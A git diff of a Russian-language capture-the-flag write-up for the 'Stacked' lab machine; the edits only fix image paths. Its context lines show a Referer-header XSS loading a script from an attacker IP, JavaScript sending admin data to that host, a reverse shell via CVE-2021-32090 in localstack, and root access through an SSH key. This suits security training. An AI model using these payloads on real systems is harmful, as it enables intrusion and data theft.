@@ -1,6 +1,6 @@
-# ⚪ Stacked(Linux, Insane)
+# ⚪ Stacked (Linux, Insane)
 
-![](../.gitbook/assets/1.png)
+![](../../../../.gitbook/assets/1.png)
 
 ### Содержание:
 
@@ -25,7 +25,7 @@ PORT   STATE SERVICE VERSION
 Service Info: Host: stacked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-![](<../.gitbook/assets/2 (1).png>)
+![](<../../../../.gitbook/assets/2 (1).png>)
 
 С формой я сделать так ничего и не смог, поэтому пошел дальше.
 
@@ -41,7 +41,7 @@ $ gobuster vhost -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt 
 Found: portfolio.stacked.htb (Status: 200) [Size: 30268]
 ```
 
-![](../.gitbook/assets/3.png)
+![](../../../../.gitbook/assets/3.png)
 
 На главной странице поддомена расположены логотипы различных технологий и ОС: docker, aws labmda,  localstack, fullstack, ubuntu, debian, centos. Это дает отсылку на то, с чем мы будем иметь дело чуть позже.
 
@@ -102,15 +102,15 @@ services:
 
 Также на поддомене распологается форма:
 
-![](../.gitbook/assets/4.png)
+![](../../../../.gitbook/assets/4.png)
 
 ### Получаем XSS в HTTP-заголовке Referer:
 
 Так как тут стоит WAF от XSS, следовательно, скорее всего тут есть XSS:thumbsup:  Поэтому, с помощью простого перебора ее можно обнаружить в заголовке Referer:
 
-![](<../.gitbook/assets/5 (5).png>)
+![](<../../../../.gitbook/assets/5 (5).png>)
 
-![](../.gitbook/assets/6.png)
+![](../../../../.gitbook/assets/6.png)
 
 ```http
 POST /process.php HTTP/1.1
@@ -130,11 +130,11 @@ Referer: <script src="http://10.10.16.93/index.js"></script>
 fullname=tragernout&email=tragernout%40stacked.htb&tel=000000000000&subject=test&message=tests
 ```
 
-![](<../.gitbook/assets/7 (1).png>)
+![](<../../../../.gitbook/assets/7 (1).png>)
 
 Чтобы увидеть HTTP заголовки реквеста админа, который "пытается" получить index.js можно использовать netcat:
 
-![](<../.gitbook/assets/8 (1).png>)
+![](<../../../../.gitbook/assets/8 (1).png>)
 
 ### Эксплуатируем XSS+CSRF, чтобы прочитать сообщения от имени админа на другом поддомене:
 
@@ -156,7 +156,7 @@ secondReq.open('POST', "http://10.10.16.93:8000/", false);
 secondReq.send(response);
 ```
 
-![](../.gitbook/assets/9.png)
+![](../../../../.gitbook/assets/9.png)
 
 В данном ответе я ничего интересного не нашел, поэтому немного изменил скрипт на самое первое сообщение и запустил по-новой:
 
@@ -182,11 +182,11 @@ secondReq.send(response);
 
 Добавляем поддомен s3-testing.stacked.htb в /etc/hosts.
 
-![](../.gitbook/assets/10.png)
+![](../../../../.gitbook/assets/10.png)
 
 Тут ничего нет, кроме строки {"status": "running"}. Как уже ранее было замечено, на сервере скорее всего используется AWS Labmda и localstack, поэтому можно попробовать создать lambda-функцию. Для этого конфигурируем aws консоль:
 
-![](../.gitbook/assets/11.png)
+![](../../../../.gitbook/assets/11.png)
 
 Теперь с помощью [данной](https://docs.aws.amazon.com/cli/latest/reference/lambda/create-function.html) инструкции составляем команду для отправки функции на сервер. Также нам понадобится javascript файл с простейшей функцией:
 
@@ -205,7 +205,7 @@ $ aws lambda --endpoint=http://s3-testing.stacked.htb invoke --function-name fun
 $ cat out
 ```
 
-![](../.gitbook/assets/12.png)
+![](../../../../.gitbook/assets/12.png)
 
 Вернулось сообщение - Hello, значит функция успешно объявлена и сохранена. Теперь мы можем попробовать эксплуатировать CVE-2021-32090:
 
@@ -215,9 +215,9 @@ $ aws lambda --endpoint=http://s3-testing.stacked.htb create-function --function
 
 Также, чтобы это работало, нам нужно перенаправить админа на панель localstack на 8080 порте:
 
-![](../.gitbook/assets/13.png)
+![](../../../../.gitbook/assets/13.png)
 
-![](../.gitbook/assets/14.png)
+![](../../../../.gitbook/assets/14.png)
 
 ### Получаем реверс шелл с помощью CVE-2021-32090:
 
@@ -243,17 +243,17 @@ $ nc -nlvp 9898
 
 Снова через BurpSuite отправляем запрос с XSS на редирект на localhost:8080. Получаем шелл:
 
-![](../.gitbook/assets/16.png)
+![](../../../../.gitbook/assets/16.png)
 
 ### Обнаружение мисконфигов с помощью PSPY:
 
 Теперь нам нужно прокинуть pspy на атакуемый хост и запустить:
 
-![](../.gitbook/assets/17.png)
+![](../../../../.gitbook/assets/17.png)
 
 Теперь, если мы выполним действия создания функции и ее проверки:
 
-![](../.gitbook/assets/18.png)
+![](../../../../.gitbook/assets/18.png)
 
 У нас появляется много векторов атак. Поэтому можно попробовать пробросить шелл от рута с помощью параметра --handler:
 
@@ -265,14 +265,14 @@ $ aws lambda --endpoint=http://s3-testing.stacked.htb create-function --function
 $ aws lambda --endpoint=http://s3-testing.stacked.htb invoke --function-name func1 out
 ```
 
-![](../.gitbook/assets/19.png)
+![](../../../../.gitbook/assets/19.png)
 
 ### Получение рута с помощью другого образа докера:
 
 Теперь можем посмотреть все образы докера и попытаться присоедениться к "другому" локалстаку:
 
-![](../.gitbook/assets/20.png)
+![](../../../../.gitbook/assets/20.png)
 
 И мы опять оказались в докере, но теперь мы можем прочитать root.txt, чтобы получить ssh-доступ от рута, нужно вписать свой SSH Public Key в /mnt/root/.ssh/authorized\_keys.
 
-![](../.gitbook/assets/21.png)
+![](../../../../.gitbook/assets/21.png)
